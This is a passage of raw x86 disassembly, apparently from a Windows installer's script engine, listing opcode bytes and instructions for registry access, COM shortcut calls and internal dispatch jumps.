  401dfe:	1b c0                	sbb    %eax,%eax
  401e00:	53                   	push   %ebx
  401e01:	23 c6                	and    %esi,%eax
  401e03:	50                   	push   %eax
  401e04:	ff 75 cc             	push   -0x34(%ebp)
  401e07:	ff 15 5c 71 40 00    	call   *0x40715c
  401e0d:	83 f8 21             	cmp    $0x21,%eax
  401e10:	0f 8d 75 0a 00 00    	jge    0x40288b
  401e16:	e9 41 08 00 00       	jmp    0x40265c
  401e1b:	53                   	push   %ebx
  401e1c:	e8 d5 0b 00 00       	call   0x4029f6
  401e21:	8b f0                	mov    %eax,%esi
  401e23:	56                   	push   %esi
  401e24:	6a eb                	push   $0xffffffeb
  401e26:	e8 7f 2f 00 00       	call   0x404daa
  401e2b:	56                   	push   %esi
  401e2c:	e8 3b 34 00 00       	call   0x40526c
  401e31:	3b c3                	cmp    %ebx,%eax
  401e33:	89 45 08             	mov    %eax,0x8(%ebp)
  401e36:	0f 84 20 08 00 00    	je     0x40265c
  401e3c:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401e3f:	74 46                	je     0x401e87
  401e41:	8b 35 04 71 40 00    	mov    0x407104,%esi
  401e47:	eb 07                	jmp    0x401e50
  401e49:	6a 0f                	push   $0xf
  401e4b:	e8 17 3f 00 00       	call   0x405d67
  401e50:	6a 64                	push   $0x64
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff d6                	call   *%esi
  401e57:	3d 02 01 00 00       	cmp    $0x102,%eax
  401e5c:	74 eb                	je     0x401e49
  401e5e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401e61:	50                   	push   %eax
  401e62:	ff 75 08             	push   0x8(%ebp)
  401e65:	ff 15 08 71 40 00    	call   *0x407108
  401e6b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401e6e:	7c 0b                	jl     0x401e7b
  401e70:	ff 75 f8             	push   -0x8(%ebp)
  401e73:	57                   	push   %edi
  401e74:	e8 f1 3a 00 00       	call   0x40596a
  401e79:	eb 0c                	jmp    0x401e87
  401e7b:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  401e7e:	74 07                	je     0x401e87
  401e80:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401e87:	ff 75 08             	push   0x8(%ebp)
  401e8a:	ff 15 ec 70 40 00    	call   *0x4070ec
  401e90:	e9 f6 09 00 00       	jmp    0x40288b
  401e95:	6a 02                	push   $0x2
  401e97:	e8 5a 0b 00 00       	call   0x4029f6
  401e9c:	50                   	push   %eax
  401e9d:	e8 65 3e 00 00       	call   0x405d07
  401ea2:	3b c3                	cmp    %ebx,%eax
  401ea4:	89 45 08             	mov    %eax,0x8(%ebp)
  401ea7:	74 13                	je     0x401ebc
  401ea9:	8b d8                	mov    %eax,%ebx
  401eab:	ff 73 14             	push   0x14(%ebx)
  401eae:	57                   	push   %edi
  401eaf:	e8 b6 3a 00 00       	call   0x40596a
  401eb4:	ff 73 18             	push   0x18(%ebx)
  401eb7:	e9 a5 f6 ff ff       	jmp    0x401561
  401ebc:	88 1e                	mov    %bl,(%esi)
  401ebe:	88 1f                	mov    %bl,(%edi)
  401ec0:	e9 97 07 00 00       	jmp    0x40265c
  401ec5:	6a ee                	push   $0xffffffee
  401ec7:	e8 2a 0b 00 00       	call   0x4029f6
  401ecc:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401ecf:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401ed2:	51                   	push   %ecx
  401ed3:	50                   	push   %eax
  401ed4:	e8 6d 4d 00 00       	call   0x406c46
  401ed9:	88 1e                	mov    %bl,(%esi)
  401edb:	3b c3                	cmp    %ebx,%eax
  401edd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401ee0:	88 1f                	mov    %bl,(%edi)
  401ee2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ee9:	0f 84 9c 09 00 00    	je     0x40288b
  401eef:	50                   	push   %eax
  401ef0:	6a 40                	push   $0x40
  401ef2:	ff 15 00 71 40 00    	call   *0x407100
  401ef8:	3b c3                	cmp    %ebx,%eax
  401efa:	89 45 08             	mov    %eax,0x8(%ebp)
  401efd:	0f 84 88 09 00 00    	je     0x40288b
  401f03:	50                   	push   %eax
  401f04:	ff 75 f8             	push   -0x8(%ebp)
  401f07:	53                   	push   %ebx
  401f08:	ff 75 d4             	push   -0x2c(%ebp)
  401f0b:	e8 30 4d 00 00       	call   0x406c40
  401f10:	85 c0                	test   %eax,%eax
  401f12:	74 34                	je     0x401f48
  401f14:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401f17:	50                   	push   %eax
  401f18:	8d 45 cc             	lea    -0x34(%ebp),%eax
  401f1b:	50                   	push   %eax
  401f1c:	68 10 90 40 00       	push   $0x409010
  401f21:	ff 75 08             	push   0x8(%ebp)
  401f24:	e8 11 4d 00 00       	call   0x406c3a
  401f29:	85 c0                	test   %eax,%eax
  401f2b:	74 1b                	je     0x401f48
  401f2d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401f30:	ff 70 08             	push   0x8(%eax)
  401f33:	56                   	push   %esi
  401f34:	e8 31 3a 00 00       	call   0x40596a
  401f39:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401f3c:	ff 70 0c             	push   0xc(%eax)
  401f3f:	57                   	push   %edi
  401f40:	e8 25 3a 00 00       	call   0x40596a
  401f45:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401f48:	ff 75 08             	push   0x8(%ebp)
  401f4b:	e9 25 fc ff ff       	jmp    0x401b75
  401f50:	39 1d 18 1c 45 00    	cmp    %ebx,0x451c18
  401f56:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f5d:	0f 8c b6 00 00 00    	jl     0x402019
  401f63:	6a f0                	push   $0xfffffff0
  401f65:	e8 8c 0a 00 00       	call   0x4029f6
  401f6a:	6a 01                	push   $0x1
  401f6c:	8b f0                	mov    %eax,%esi
  401f6e:	e8 83 0a 00 00       	call   0x4029f6
  401f73:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  401f76:	89 45 08             	mov    %eax,0x8(%ebp)
  401f79:	74 0d                	je     0x401f88
  401f7b:	56                   	push   %esi
  401f7c:	ff 15 0c 71 40 00    	call   *0x40710c
  401f82:	8b f8                	mov    %eax,%edi
  401f84:	3b fb                	cmp    %ebx,%edi
  401f86:	75 10                	jne    0x401f98
  401f88:	6a 08                	push   $0x8
  401f8a:	53                   	push   %ebx
  401f8b:	56                   	push   %esi
  401f8c:	ff 15 10 71 40 00    	call   *0x407110
  401f92:	8b f8                	mov    %eax,%edi
  401f94:	3b fb                	cmp    %ebx,%edi
  401f96:	74 7a                	je     0x402012
  401f98:	ff 75 08             	push   0x8(%ebp)
  401f9b:	57                   	push   %edi
  401f9c:	ff 15 14 71 40 00    	call   *0x407114
  401fa2:	8b f0                	mov    %eax,%esi
  401fa4:	3b f3                	cmp    %ebx,%esi
  401fa6:	74 3d                	je     0x401fe5
  401fa8:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401fab:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401fae:	74 17                	je     0x401fc7
  401fb0:	ff 75 e4             	push   -0x1c(%ebp)
  401fb3:	e8 6b f4 ff ff       	call   0x401423
  401fb8:	ff d6                	call   *%esi
  401fba:	85 c0                	test   %eax,%eax
  401fbc:	74 31                	je     0x401fef
  401fbe:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fc5:	eb 28                	jmp    0x401fef
  401fc7:	68 00 90 40 00       	push   $0x409000
  401fcc:	68 80 3b 41 00       	push   $0x413b80
  401fd1:	68 00 20 45 00       	push   $0x452000
  401fd6:	68 00 20 00 00       	push   $0x2000
  401fdb:	ff 75 cc             	push   -0x34(%ebp)
  401fde:	ff d6                	call   *%esi
  401fe0:	83 c4 14             	add    $0x14,%esp
  401fe3:	eb 0a                	jmp    0x401fef
  401fe5:	ff 75 08             	push   0x8(%ebp)
  401fe8:	6a f7                	push   $0xfffffff7
  401fea:	e8 bb 2d 00 00       	call   0x404daa
  401fef:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401ff2:	0f 85 93 08 00 00    	jne    0x40288b
  401ff8:	57                   	push   %edi
  401ff9:	e8 f7 14 00 00       	call   0x4034f5
  401ffe:	85 c0                	test   %eax,%eax
  402000:	0f 84 85 08 00 00    	je     0x40288b
  402006:	57                   	push   %edi
  402007:	ff 15 18 71 40 00    	call   *0x407118
  40200d:	e9 79 08 00 00       	jmp    0x40288b
  402012:	6a f6                	push   $0xfffffff6
  402014:	e9 4b 01 00 00       	jmp    0x402164
  402019:	6a e7                	push   $0xffffffe7
  40201b:	e9 44 01 00 00       	jmp    0x402164
  402020:	6a f0                	push   $0xfffffff0
  402022:	e8 cf 09 00 00       	call   0x4029f6
  402027:	6a df                	push   $0xffffffdf
  402029:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40202c:	e8 c5 09 00 00       	call   0x4029f6
  402031:	6a 02                	push   $0x2
  402033:	8b f0                	mov    %eax,%esi
  402035:	e8 bc 09 00 00       	call   0x4029f6
  40203a:	6a cd                	push   $0xffffffcd
  40203c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40203f:	e8 b2 09 00 00       	call   0x4029f6
  402044:	6a 45                	push   $0x45
  402046:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402049:	e8 a8 09 00 00       	call   0x4029f6
  40204e:	56                   	push   %esi
  40204f:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402052:	e8 15 35 00 00       	call   0x40556c
  402057:	85 c0                	test   %eax,%eax
  402059:	75 07                	jne    0x402062
  40205b:	6a 21                	push   $0x21
  40205d:	e8 94 09 00 00       	call   0x4029f6
  402062:	8d 45 08             	lea    0x8(%ebp),%eax
  402065:	50                   	push   %eax
  402066:	68 80 74 40 00       	push   $0x407480
  40206b:	6a 01                	push   $0x1
  40206d:	53                   	push   %ebx
  40206e:	68 90 74 40 00       	push   $0x407490
  402073:	ff 15 84 72 40 00    	call   *0x407284
  402079:	3b c3                	cmp    %ebx,%eax
  40207b:	0f 8c da 00 00 00    	jl     0x40215b
  402081:	8b 45 08             	mov    0x8(%ebp),%eax
  402084:	8d 55 cc             	lea    -0x34(%ebp),%edx
  402087:	52                   	push   %edx
  402088:	68 a0 74 40 00       	push   $0x4074a0
  40208d:	8b 08                	mov    (%eax),%ecx
  40208f:	50                   	push   %eax
  402090:	ff 11                	call   *(%ecx)
  402092:	8b f8                	mov    %eax,%edi
  402094:	3b fb                	cmp    %ebx,%edi
  402096:	0f 8c b2 00 00 00    	jl     0x40214e
  40209c:	8b 45 08             	mov    0x8(%ebp),%eax
  40209f:	56                   	push   %esi
  4020a0:	50                   	push   %eax
  4020a1:	8b 08                	mov    (%eax),%ecx
  4020a3:	ff 51 50             	call   *0x50(%ecx)
  4020a6:	8b f8                	mov    %eax,%edi
  4020a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4020ab:	68 00 e0 47 00       	push   $0x47e000
  4020b0:	50                   	push   %eax
  4020b1:	8b 08                	mov    (%eax),%ecx
  4020b3:	ff 51 24             	call   *0x24(%ecx)
  4020b6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020b9:	be ff 00 00 00       	mov    $0xff,%esi
  4020be:	8b c1                	mov    %ecx,%eax
  4020c0:	c1 f8 08             	sar    $0x8,%eax
  4020c3:	23 c6                	and    %esi,%eax
  4020c5:	74 0d                	je     0x4020d4
  4020c7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020ca:	50                   	push   %eax
  4020cb:	51                   	push   %ecx
  4020cc:	8b 11                	mov    (%ecx),%edx
  4020ce:	ff 52 3c             	call   *0x3c(%edx)
  4020d1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4020d7:	c1 f9 10             	sar    $0x10,%ecx
  4020da:	8b 10                	mov    (%eax),%edx
  4020dc:	51                   	push   %ecx
  4020dd:	50                   	push   %eax
  4020de:	ff 52 34             	call   *0x34(%edx)
  4020e1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020e4:	38 18                	cmp    %bl,(%eax)
  4020e6:	74 12                	je     0x4020fa
  4020e8:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4020eb:	8b 45 08             	mov    0x8(%ebp),%eax
  4020ee:	23 d6                	and    %esi,%edx
  4020f0:	8b 08                	mov    (%eax),%ecx
  4020f2:	52                   	push   %edx
  4020f3:	ff 75 f8             	push   -0x8(%ebp)
  4020f6:	50                   	push   %eax
  4020f7:	ff 51 44             	call   *0x44(%ecx)
  4020fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4020fd:	ff 75 d4             	push   -0x2c(%ebp)
  402100:	8b 08                	mov    (%eax),%ecx
  402102:	50                   	push   %eax
  402103:	ff 51 2c             	call   *0x2c(%ecx)
  402106:	8b 45 08             	mov    0x8(%ebp),%eax
  402109:	ff 75 bc             	push   -0x44(%ebp)
  40210c:	8b 08                	mov    (%eax),%ecx
  40210e:	50                   	push   %eax
  40210f:	ff 51 1c             	call   *0x1c(%ecx)
  402112:	3b fb                	cmp    %ebx,%edi
  402114:	7c 2f                	jl     0x402145
  402116:	be 78 93 40 00       	mov    $0x409378,%esi
  40211b:	68 00 04 00 00       	push   $0x400
  402120:	56                   	push   %esi
  402121:	6a ff                	push   $0xffffffff
  402123:	ff 75 d0             	push   -0x30(%ebp)
  402126:	bf 05 40 00 80       	mov    $0x80004005,%edi
  40212b:	53                   	push   %ebx
  40212c:	53                   	push   %ebx
  40212d:	ff 15 1c 71 40 00    	call   *0x40711c
  402133:	85 c0                	test   %eax,%eax
  402135:	74 0e                	je     0x402145
  402137:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40213a:	6a 01                	push   $0x1
  40213c:	56                   	push   %esi
  40213d:	50                   	push   %eax
  40213e:	8b 08                	mov    (%eax),%ecx
  402140:	ff 51 18             	call   *0x18(%ecx)
  402143:	8b f8                	mov    %eax,%edi
  402145:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402148:	50                   	push   %eax
  402149:	8b 08                	mov    (%eax),%ecx
  40214b:	ff 51 08             	call   *0x8(%ecx)
  40214e:	8b 45 08             	mov    0x8(%ebp),%eax
  402151:	50                   	push   %eax
  402152:	8b 08                	mov    (%eax),%ecx
  402154:	ff 51 08             	call   *0x8(%ecx)
  402157:	3b fb                	cmp    %ebx,%edi
  402159:	7d 13                	jge    0x40216e
  40215b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402162:	6a f0                	push   $0xfffffff0
  402164:	e8 ba f2 ff ff       	call   0x401423
  402169:	e9 1d 07 00 00       	jmp    0x40288b
  40216e:	6a f4                	push   $0xfffffff4
  402170:	eb f2                	jmp    0x402164
  402172:	53                   	push   %ebx
  402173:	e8 7e 08 00 00       	call   0x4029f6
  402178:	6a 11                	push   $0x11
  40217a:	8b f0                	mov    %eax,%esi
  40217c:	e8 75 08 00 00       	call   0x4029f6
  402181:	6a 23                	push   $0x23
  402183:	8b f8                	mov    %eax,%edi
  402185:	e8 6c 08 00 00       	call   0x4029f6
  40218a:	56                   	push   %esi
  40218b:	89 45 08             	mov    %eax,0x8(%ebp)
  40218e:	e8 74 3b 00 00       	call   0x405d07
  402193:	85 c0                	test   %eax,%eax
  402195:	75 0d                	jne    0x4021a4
  402197:	53                   	push   %ebx
  402198:	6a f9                	push   $0xfffffff9
  40219a:	e8 0b 2c 00 00       	call   0x404daa
  40219f:	e9 b8 04 00 00       	jmp    0x40265c
  4021a4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4021a7:	56                   	push   %esi
  4021a8:	89 45 9c             	mov    %eax,-0x64(%ebp)
  4021ab:	c7 45 a0 02 00 00 00 	movl   $0x2,-0x60(%ebp)
  4021b2:	e8 6b 38 00 00       	call   0x405a22
  4021b7:	57                   	push   %edi
  4021b8:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  4021bc:	e8 61 38 00 00       	call   0x405a22
  4021c1:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  4021c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c8:	66 8b 4d e4          	mov    -0x1c(%ebp),%cx
  4021cc:	50                   	push   %eax
  4021cd:	53                   	push   %ebx
  4021ce:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  4021d1:	89 7d a8             	mov    %edi,-0x58(%ebp)
  4021d4:	89 45 b6             	mov    %eax,-0x4a(%ebp)
  4021d7:	66 89 4d ac          	mov    %cx,-0x54(%ebp)
  4021db:	e8 ca 2b 00 00       	call   0x404daa
  4021e0:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4021e3:	50                   	push   %eax
  4021e4:	ff 15 60 71 40 00    	call   *0x407160
  4021ea:	85 c0                	test   %eax,%eax
  4021ec:	0f 84 99 06 00 00    	je     0x40288b
  4021f2:	eb a3                	jmp    0x402197
  4021f4:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4021f9:	74 1d                	je     0x402218
  4021fb:	68 10 00 20 00       	push   $0x200010
  402200:	6a e8                	push   $0xffffffe8
  402202:	53                   	push   %ebx
  402203:	e8 26 38 00 00       	call   0x405a2e
  402208:	50                   	push   %eax
  402209:	e8 bf 30 00 00       	call   0x4052cd
  40220e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402213:	e9 7e 06 00 00       	jmp    0x402896
  402218:	ff 05 f4 1b 45 00    	incl   0x451bf4
  40221e:	e9 68 06 00 00       	jmp    0x40288b
  402223:	33 f6                	xor    %esi,%esi
  402225:	33 ff                	xor    %edi,%edi
  402227:	3b c3                	cmp    %ebx,%eax
  402229:	74 0b                	je     0x402236
  40222b:	53                   	push   %ebx
  40222c:	e8 c5 07 00 00       	call   0x4029f6
  402231:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402234:	8b f0                	mov    %eax,%esi
  402236:	3b d3                	cmp    %ebx,%edx
  402238:	74 09                	je     0x402243
  40223a:	6a 11                	push   $0x11
  40223c:	e8 b5 07 00 00       	call   0x4029f6
  402241:	8b f8                	mov    %eax,%edi
  402243:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402246:	74 09                	je     0x402251
  402248:	6a 22                	push   $0x22
  40224a:	e8 a7 07 00 00       	call   0x4029f6
  40224f:	8b d8                	mov    %eax,%ebx
  402251:	6a cd                	push   $0xffffffcd
  402253:	e8 9e 07 00 00       	call   0x4029f6
  402258:	50                   	push   %eax
  402259:	53                   	push   %ebx
  40225a:	57                   	push   %edi
  40225b:	56                   	push   %esi
  40225c:	ff 15 20 71 40 00    	call   *0x407120
  402262:	e9 3f f3 ff ff       	jmp    0x4015a6
  402267:	6a 01                	push   $0x1
  402269:	c7 45 08 21 4e 7e 00 	movl   $0x7e4e21,0x8(%ebp)
  402270:	e8 81 07 00 00       	call   0x4029f6
  402275:	6a 12                	push   $0x12
  402277:	8b f8                	mov    %eax,%edi
  402279:	e8 78 07 00 00       	call   0x4029f6
  40227e:	6a dd                	push   $0xffffffdd
  402280:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402283:	e8 6e 07 00 00       	call   0x4029f6
  402288:	50                   	push   %eax
  402289:	68 ff 1f 00 00       	push   $0x1fff
  40228e:	8d 45 08             	lea    0x8(%ebp),%eax
  402291:	56                   	push   %esi
  402292:	50                   	push   %eax
  402293:	ff 75 d0             	push   -0x30(%ebp)
  402296:	57                   	push   %edi
  402297:	ff 15 24 71 40 00    	call   *0x407124
  40229d:	8b 06                	mov    (%esi),%eax
  40229f:	3b 45 08             	cmp    0x8(%ebp),%eax
  4022a2:	e9 6f f4 ff ff       	jmp    0x401716
  4022a7:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4022aa:	75 2b                	jne    0x4022d7
  4022ac:	6a 02                	push   $0x2
  4022ae:	e8 4d 08 00 00       	call   0x402b00
  4022b3:	8b f0                	mov    %eax,%esi
  4022b5:	3b f3                	cmp    %ebx,%esi
  4022b7:	0f 84 9f 03 00 00    	je     0x40265c
  4022bd:	6a 33                	push   $0x33
  4022bf:	e8 32 07 00 00       	call   0x4029f6
  4022c4:	50                   	push   %eax
  4022c5:	56                   	push   %esi
  4022c6:	ff 15 18 70 40 00    	call   *0x407018
  4022cc:	56                   	push   %esi
  4022cd:	8b f8                	mov    %eax,%edi
  4022cf:	ff 15 1c 70 40 00    	call   *0x40701c
  4022d5:	eb 1f                	jmp    0x4022f6
  4022d7:	6a 22                	push   $0x22
  4022d9:	e8 18 07 00 00       	call   0x4029f6
  4022de:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022e1:	83 e1 02             	and    $0x2,%ecx
  4022e4:	51                   	push   %ecx
  4022e5:	50                   	push   %eax
  4022e6:	ff 75 e0             	push   -0x20(%ebp)
  4022e9:	e8 fd 07 00 00       	call   0x402aeb
  4022ee:	50                   	push   %eax
  4022ef:	e8 42 07 00 00       	call   0x402a36
  4022f4:	8b f8                	mov    %eax,%edi
  4022f6:	3b fb                	cmp    %ebx,%edi
  4022f8:	0f 84 8d 05 00 00    	je     0x40288b
  4022fe:	e9 59 03 00 00       	jmp    0x40265c
  402303:	50                   	push   %eax
  402304:	e8 e2 07 00 00       	call   0x402aeb
  402309:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40230c:	8b f8                	mov    %eax,%edi
  40230e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402311:	6a 02                	push   $0x2
  402313:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402316:	e8 db 06 00 00       	call   0x4029f6
  40231b:	6a 11                	push   $0x11
  40231d:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402320:	e8 d1 06 00 00       	call   0x4029f6
  402325:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402328:	53                   	push   %ebx
  402329:	51                   	push   %ecx
  40232a:	8b 0d 10 1c 45 00    	mov    0x451c10,%ecx
  402330:	83 c9 02             	or     $0x2,%ecx
  402333:	53                   	push   %ebx
  402334:	51                   	push   %ecx
  402335:	53                   	push   %ebx
  402336:	53                   	push   %ebx
  402337:	53                   	push   %ebx
  402338:	50                   	push   %eax
  402339:	57                   	push   %edi
  40233a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402341:	ff 15 20 70 40 00    	call   *0x407020
  402347:	85 c0                	test   %eax,%eax
  402349:	0f 85 3c 05 00 00    	jne    0x40288b
  40234f:	83 fe 01             	cmp    $0x1,%esi
  402352:	bf 80 db 40 00       	mov    $0x40db80,%edi
  402357:	75 0e                	jne    0x402367
  402359:	6a 23                	push   $0x23
  40235b:	e8 96 06 00 00       	call   0x4029f6
  402360:	57                   	push   %edi
  402361:	e8 bc 36 00 00       	call   0x405a22
  402366:	40                   	inc    %eax
  402367:	83 fe 04             	cmp    $0x4,%esi
  40236a:	75 0e                	jne    0x40237a
  40236c:	6a 03                	push   $0x3
  40236e:	e8 66 06 00 00       	call   0x4029d9
  402373:	56                   	push   %esi
  402374:	a3 80 db 40 00       	mov    %eax,0x40db80
  402379:	58                   	pop    %eax
  40237a:	83 fe 03             	cmp    $0x3,%esi
  40237d:	75 0f                	jne    0x40238e
  40237f:	68 00 60 00 00       	push   $0x6000
  402384:	57                   	push   %edi
  402385:	53                   	push   %ebx
  402386:	ff 75 e8             	push   -0x18(%ebp)
  402389:	e8 cd 0a 00 00       	call   0x402e5b
  40238e:	50                   	push   %eax
  40238f:	57                   	push   %edi
  402390:	ff 75 d0             	push   -0x30(%ebp)
  402393:	53                   	push   %ebx
  402394:	ff 75 bc             	push   -0x44(%ebp)
  402397:	ff 75 08             	push   0x8(%ebp)
  40239a:	ff 15 04 70 40 00    	call   *0x407004
  4023a0:	85 c0                	test   %eax,%eax
  4023a2:	75 03                	jne    0x4023a7
  4023a4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4023a7:	ff 75 08             	push   0x8(%ebp)
  4023aa:	e9 ce 00 00 00       	jmp    0x40247d
  4023af:	68 19 00 02 00       	push   $0x20019
  4023b4:	e8 47 07 00 00       	call   0x402b00
  4023b9:	6a 33                	push   $0x33
  4023bb:	8b f8                	mov    %eax,%edi
  4023bd:	e8 34 06 00 00       	call   0x4029f6
  4023c2:	3b fb                	cmp    %ebx,%edi
  4023c4:	88 1e                	mov    %bl,(%esi)
  4023c6:	0f 84 90 02 00 00    	je     0x40265c
  4023cc:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4023cf:	c7 45 f8 ff 1f 00 00 	movl   $0x1fff,-0x8(%ebp)
  4023d6:	51                   	push   %ecx
  4023d7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4023da:	56                   	push   %esi
  4023db:	51                   	push   %ecx
  4023dc:	53                   	push   %ebx
  4023dd:	50                   	push   %eax
  4023de:	57                   	push   %edi
  4023df:	ff 15 00 70 40 00    	call   *0x407000
  4023e5:	33 c9                	xor    %ecx,%ecx
  4023e7:	41                   	inc    %ecx
  4023e8:	85 c0                	test   %eax,%eax
  4023ea:	75 34                	jne    0x402420
  4023ec:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  4023f0:	74 19                	je     0x40240b
  4023f2:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4023f5:	74 06                	je     0x4023fd
  4023f7:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4023fb:	75 23                	jne    0x402420
  4023fd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402400:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402403:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402406:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  402409:	eb 71                	jmp    0x40247c
  40240b:	ff 36                	push   (%esi)
  40240d:	33 c0                	xor    %eax,%eax
  40240f:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402412:	56                   	push   %esi
  402413:	0f 94 c0             	sete   %al
  402416:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402419:	e8 4c 35 00 00       	call   0x40596a
  40241e:	eb 5c                	jmp    0x40247c
  402420:	88 1e                	mov    %bl,(%esi)
  402422:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402425:	eb 55                	jmp    0x40247c
  402427:	68 19 00 02 00       	push   $0x20019
  40242c:	e8 cf 06 00 00       	call   0x402b00
  402431:	6a 03                	push   $0x3
  402433:	8b f8                	mov    %eax,%edi
  402435:	e8 9f 05 00 00       	call   0x4029d9
  40243a:	3b fb                	cmp    %ebx,%edi
  40243c:	88 1e                	mov    %bl,(%esi)
  40243e:	0f 84 18 02 00 00    	je     0x40265c
  402444:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402447:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  40244c:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40244f:	74 0c                	je     0x40245d
  402451:	51                   	push   %ecx
  402452:	56                   	push   %esi
  402453:	50                   	push   %eax
  402454:	57                   	push   %edi
  402455:	ff 15 08 70 40 00    	call   *0x407008
  40245b:	eb 19                	jmp    0x402476
  40245d:	53                   	push   %ebx
  40245e:	53                   	push   %ebx
  40245f:	53                   	push   %ebx
  402460:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402463:	53                   	push   %ebx
  402464:	51                   	push   %ecx
  402465:	56                   	push   %esi
  402466:	50                   	push   %eax
  402467:	57                   	push   %edi
  402468:	ff 15 0c 70 40 00    	call   *0x40700c
  40246e:	85 c0                	test   %eax,%eax
  402470:	0f 85 e6 01 00 00    	jne    0x40265c
  402476:	88 9e ff 1f 00 00    	mov    %bl,0x1fff(%esi)
  40247c:	57                   	push   %edi
  40247d:	ff 15 1c 70 40 00    	call   *0x40701c
  402483:	e9 03 04 00 00       	jmp    0x40288b
  402488:	38 1e                	cmp    %bl,(%esi)
  40248a:	0f 84 fb 03 00 00    	je     0x40288b
  402490:	56                   	push   %esi
  402491:	e8 ed 34 00 00       	call   0x405983
  402496:	50                   	push   %eax
  402497:	e9 ee f9 ff ff       	jmp    0x401e8a
  40249c:	6a ed                	push   $0xffffffed
  40249e:	e8 53 05 00 00       	call   0x4029f6
  4024a3:	ff 75 e4             	push   -0x1c(%ebp)
  4024a6:	ff 75 e0             	push   -0x20(%ebp)
  4024a9:	50                   	push   %eax
  4024aa:	e8 34 32 00 00       	call   0x4056e3
  4024af:	83 f8 ff             	cmp    $0xffffffff,%eax
  4024b2:	0f 84 a2 01 00 00    	je     0x40265a
  4024b8:	50                   	push   %eax
  4024b9:	e9 a3 f0 ff ff       	jmp    0x401561
  4024be:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4024c1:	74 11                	je     0x4024d4
  4024c3:	6a 01                	push   $0x1
  4024c5:	e8 0f 05 00 00       	call   0x4029d9
  4024ca:	a2 80 bb 40 00       	mov    %al,0x40bb80
  4024cf:	33 c0                	xor    %eax,%eax
  4024d1:	40                   	inc    %eax
  4024d2:	eb 0d                	jmp    0x4024e1
  4024d4:	6a 11                	push   $0x11
  4024d6:	e8 1b 05 00 00       	call   0x4029f6
  4024db:	50                   	push   %eax
  4024dc:	e8 41 35 00 00       	call   0x405a22
  4024e1:	38 1e                	cmp    %bl,(%esi)
  4024e3:	0f 84 73 01 00 00    	je     0x40265c
  4024e9:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024ec:	53                   	push   %ebx
  4024ed:	51                   	push   %ecx
  4024ee:	50                   	push   %eax
  4024ef:	68 80 bb 40 00       	push   $0x40bb80
  4024f4:	56                   	push   %esi
  4024f5:	e8 89 34 00 00       	call   0x405983
  4024fa:	50                   	push   %eax
  4024fb:	ff 15 28 71 40 00    	call   *0x407128
